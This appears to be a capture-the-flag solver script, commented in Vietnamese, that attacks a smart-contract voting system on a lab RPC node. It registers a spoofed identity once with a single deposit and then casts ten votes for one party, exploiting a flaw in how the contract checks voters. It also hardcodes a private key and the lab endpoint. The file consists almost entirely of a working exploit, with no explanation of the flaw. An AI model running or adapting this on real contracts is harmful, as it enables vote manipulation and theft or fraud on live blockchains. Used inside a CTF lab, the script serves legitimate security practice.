#!/usr/bin/env python3
 
from web3 import Web3
from eth_account import Account
import time

# ======================================================================
# BƯỚC 1: LẤY THÔNG TIN MỚI NHẤT VÀ ĐIỀN VÀO ĐÂY
# ======================================================================
RPC_URL = "http://94.237.61.242:50827"
PRIVATE_KEY = "0xbe7b676b04d5d61280a04781b59a898a6f94c09cd09193eba75ea9ce64300790" 
TARGET_CONTRACT_ADDRESS = "0x7990360A8B8aA7B9c8834e0F56E6D887D84E2C38"
# ======================================================================


ABI = """
[{"inputs":[{"internalType":"string","name":"_name","type":"string"},{"internalType":"string","name":"_surname","type":"string"}],"name":"depositVoteCollateral","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"bytes3","name":"_party","type":"bytes3"},{"internalType":"string","name":"_name","type":"string"},{"internalType":"string","name":"_surname","type":"string"}],"name":"vote","outputs":[],"stateMutability":"nonpayable","type":"function"}]
"""
 
def solve():
    print("[+] Đang kết nối đến RPC Node...")
    w3 = Web3(Web3.HTTPProvider(RPC_URL))
    if not w3.is_connected():
        print("[-] Lỗi: Không thể kết nối.")
        return
    print(" -> Kết nối thành công!")

    account = Account.from_key(PRIVATE_KEY)
    attacker_address = account.address
    print(f"[+] Địa chỉ Attacker: {attacker_address}")
    
    target_contract = w3.eth.contract(address=w3.to_checksum_address(TARGET_CONTRACT_ADDRESS), abi=ABI)
    
    # --- Bắt đầu khai thác ---
    name = "Satosh"
    surname = "iNakamoto"
    # SỬA LỖI QUAN TRỌNG: bytes3 "CIM" chỉ là 3 bytes, không có \x00
    cim = b"CIM"
    
    current_nonce = w3.eth.get_transaction_count(attacker_address)
    
    # Bước 1: Deposit MỘT LẦN
    print("\n[+] Bước 1: Đăng ký danh tính giả mạo ('Satosh', 'iNakamoto')...")
    try:
        deposit_tx = target_contract.functions.depositVoteCollateral(name, surname).build_transaction({
            'from': attacker_address,
            'nonce': current_nonce,
            'value': 1,
            'gasPrice': w3.eth.gas_price
        })
        signed_tx_deposit = w3.eth.account.sign_transaction(deposit_tx, private_key=PRIVATE_KEY)
        tx_hash_deposit = w3.eth.send_raw_transaction(signed_tx_deposit.raw_transaction)
        print(f" -> Giao dịch deposit đã gửi (Hash: {tx_hash_deposit.hex()}), đang chờ xác nhận...")
        w3.eth.wait_for_transaction_receipt(tx_hash_deposit, timeout=180)
        print(" -> Đăng ký thành công!")
        current_nonce += 1
    except Exception as e:
        print(f"[!] Lỗi khi đăng ký danh tính: {e}")
        print("[!] Rất có thể danh tính này đã tồn tại trên instance hiện tại. Thử bỏ qua bước này và vote trực tiếp.")

    # Bước 2: Bỏ phiếu 10 lần
    print("\n[+] Bước 2: Bỏ phiếu 10 lần cho CIM...")
    for i in range(10):
        print(f"  -> Lần vote {i+1}/10...")
        try:
            # Lấy lại nonce mới nhất trước mỗi lần vote để đảm bảo không bị lỗi
            nonce_for_vote = w3.eth.get_transaction_count(attacker_address)
            vote_tx = target_contract.functions.vote(cim, name, surname).build_transaction({
                'from': attacker_address,
                'nonce': nonce_for_vote,
                'gasPrice': w3.eth.gas_price
            })
            signed_tx_vote = w3.eth.account.sign_transaction(vote_tx, private_key=PRIVATE_KEY)
            tx_hash_vote = w3.eth.send_raw_transaction(signed_tx_vote.raw_transaction)
            w3.eth.wait_for_transaction_receipt(tx_hash_vote, timeout=180)
            print(f"   -> Vote {i+1} thành công.")
            time.sleep(1) # Đợi 1 giây giữa các giao dịch để tránh nghẽn
        except Exception as e:
            print(f"   -> Lỗi khi vote lần {i+1}: {e}. Dừng lại.")
            return

    print("\n[SUCCESS] Đã gửi đủ 10 phiếu bầu. Hãy kiểm tra flag trên server `netcat`!")

if __name__ == "__main__":
    solve()